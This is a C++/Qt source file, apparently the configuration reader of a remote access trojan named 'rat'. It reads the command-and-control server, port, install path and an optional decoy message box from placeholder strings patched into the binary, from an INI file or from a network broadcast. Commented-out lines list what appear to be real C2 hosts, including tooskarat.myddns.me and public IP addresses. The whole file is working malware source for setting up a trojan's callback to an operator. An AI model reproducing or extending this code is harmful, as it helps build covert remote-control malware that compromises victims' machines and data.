#include "configreader.h"

#include <QDebug>
#include <QFile>
#include <QSettings>
#include <QGuiApplication>
#include <ClientHub>
#include "../common/consts.h"
#include "../common/pathplaceholder.h"
#include "../../config.h"
#include <utility>
#include <array>
#include <iostream>

namespace options
{
    template<unsigned... digits>
    struct to_chars {
        static constexpr const char value[]  = {('0' + digits)..., 0};
    };

    template<unsigned... digits>
    constexpr char to_chars<digits...>::value[];// = {('0' + digits)..., 0};

    template<unsigned rem, unsigned... digits>
    struct explode : explode<rem / 10, rem % 10, digits...> {};

    template<unsigned... digits>
    struct explode<0, digits...> : to_chars<digits...> {};

    constexpr int digit_len(int n) {
        return n ? digit_len(n / 10) + 1 : 0;
    }

    template<unsigned...>
    struct seq{using type=seq;};

    template<unsigned N, unsigned... Is>
    struct gen_seq_x : gen_seq_x<N-1, N-1, Is...>{};

    template<unsigned... Is>
    struct gen_seq_x<0, Is...> : seq<Is...>{};

    template<unsigned N>
    using gen_seq=typename gen_seq_x<N>::type;

    template<size_t S>
    using size=std::integral_constant<size_t, S>;

    template<class T, size_t N>
    constexpr size<N> length( T const(&)[N] ) { return {}; }
    template<class T, size_t N>
    constexpr size<N> length( std::array<T, N> const& ) { return {}; }

    template<class T>
    using length_t = decltype(length(std::declval<T>()));

    constexpr size_t string_size() { return 0; }
    template<class...Ts>
    constexpr size_t string_size( size_t i, Ts... ts ) {
        return (i?i-1:0) + string_size(ts...);
    }
    template<class...Ts>
    using string_length=size< string_size( length_t<Ts>{}... )>;

    template<int N>
    using fixed_string = std::array<char, N+1>;

    template<int N, class S, class W, class SN, unsigned...IS, unsigned...IW, unsigned...IN>
    constexpr const fixed_string<N>
    concat_impl( S const& str, W const& whitespace, SN const& num, seq<IS...>, seq<IW...>, seq<IN...>)
    {
        return {{ '*', '*',
                str[IS]...,
                        '*', '*',
                        num[IN]...,
                        '*', '*',
                        whitespace[IW]...,
                        '\0' }};
    }

    template<unsigned num>
    struct num_to_string : explode<num> {};

    template<std::size_t N>
    struct whitespace_string
    {
        constexpr whitespace_string()
        {}
        constexpr char operator[] (int) const {
            return ' ';
        }
    };


    template<int N, class Lhs>
    constexpr const fixed_string<N>
    create(Lhs const& str)
    {
        constexpr auto a = num_to_string<N>::value;
        constexpr char n_size = digit_len(N);// / sizeof(char);
        constexpr auto str_size = string_length<Lhs>{};
        constexpr whitespace_string<N> spaces;

        return concat_impl<N>(str, spaces, a,
                                        gen_seq<str_size>{},
                                        gen_seq<N-str_size-6-n_size>{},
                                        gen_seq<n_size>{});
    }
}


constexpr auto is_ready = options::create<16>("is_ready");
constexpr auto opt_server = options::create<30>("server");
constexpr auto opt_port = options::create<12>("port");
constexpr auto show_message = options::create<20>("show_message");
constexpr auto message_header = options::create<50>("message_header");
constexpr auto message_body = options::create<200>("message_body");
constexpr auto install_path = options::create<50>("install_path");
constexpr auto app_name = options::create<30>("app_name");

template<typename T>
static T readOption(const char* data) {
    Q_UNUSED(data);
}

template<>
bool readOption<bool>(const char *data)
{
    QString d(data);
    return d.trimmed().toLower() == "true";
}

template<>
QString readOption<QString>(const char *data)
{
    return QString(data).trimmed();
}

template<>
int readOption<int>(const char *data)
{
    QString d(data);
    bool ok;
    int n = d.trimmed().toInt(&ok);
    if (ok)
        return n;
    return 0;
}

bool ConfigReader::showMessageBox() const
{
    return _showMessageBox;
}

QString ConfigReader::messageBoxTitle() const
{
    return _messageBoxTitle;
}

QString ConfigReader::messageBoxBody() const
{
    return _messageBoxBody;
}

QString ConfigReader::appName() const
{
    return _appName;
}

Neuron::ClientHub *ConfigReader::clientHub() const
{
    return _clientHub;
}

void ConfigReader::setClientHub(Neuron::ClientHub *clientHub)
{
    _clientHub = clientHub;
}

void ConfigReader::print() const
{
#define PRINT(x) qDebug() << #x "=" << x
    PRINT(_server);
    PRINT(_port);
    PRINT(_showMessageBox);
    PRINT(_messageBoxTitle);
    PRINT(_messageBoxBody);
    PRINT(_installPath);
    PRINT(_appName);
#undef PRINT
}

ConfigReader::ConfigReader() : _port(0), _showMessageBox(false), _appName("rat")
{
    Q_UNUSED(is_ready)
    Q_UNUSED(opt_server)
    Q_UNUSED(opt_port)

    Q_UNUSED(show_message)
    Q_UNUSED(install_path)

    Q_UNUSED(app_name)
}

quint16 ConfigReader::port() const
{
    return _port;
}

QString ConfigReader::server() const
{
    return _server;
}

QString ConfigReader::messageHeader() const
{
    return readOption<QString>(message_header.data());
}

QString ConfigReader::messageBody() const
{
    return readOption<QString>(message_body.data());
}

QString ConfigReader::installPath() const
{
    return PathPlaceholder::validateLocation(_installPath);
}

bool ConfigReader::read(const ReadTypes &t)
{
#ifdef RAT_IS_FAKE
//    _server = "tooskarat.myddns.me";
//    _server = "tooska.ddns.net";
//    _server = "192.168.1.9";
//    _server = "213.32.14.68";
//    _server = "80.82.70.161";
    _server = "127.0.0.1";
    _port = 5100;
    return true;
#endif

    if (t & InsideFile && readInFile())
        return true;

    if (t & SettingFile && readConfig())
        return true;

    if (t & BroadCasting && findInBroadcast())
        return true;

    return false;
}

void ConfigReader::createSampleData()
{
    QSettings sampleSsettings(qApp->applicationDirPath() + "/data-sample.ini", QSettings::IniFormat);
    sampleSsettings.beginGroup("connection");
    sampleSsettings.setValue("port", NEURON_PORT);
    sampleSsettings.setValue("server", "127.0.0.1");
    sampleSsettings.sync();
    qDebug() << "Sample data created:" << sampleSsettings.fileName();
}

bool ConfigReader::readConfig() {
    QSettings settings(qApp->applicationDirPath() + "/data.ini", QSettings::IniFormat);
    if (!QFile::exists(settings.fileName())) {
        return false;
    }
    settings.beginGroup("connection");
    _port = settings.value("port").value<quint16>();
    _server = settings.value("server").toString();

    return true;
}

bool ConfigReader::findInBroadcast()
{
    return _clientHub->findDataFromBroadcast(BROADCAST_PORT, _port, _server, 4000);
}

bool ConfigReader::readInFile()
{
    bool is_read = readOption<bool>(is_ready.data());
    if (!is_read)
        return false;

    _port = readOption<int>(opt_port.data());
    _server = readOption<QString>(opt_server.data());

    _installPath = readOption<QString>(install_path.data());
    _showMessageBox = readOption<bool>(show_message.data());
    _messageBoxTitle = readOption<QString>(message_header.data());
    _messageBoxBody = readOption<QString>(message_body.data());

    _appName = readOption<QString>(app_name.data());

    return is_read;
}


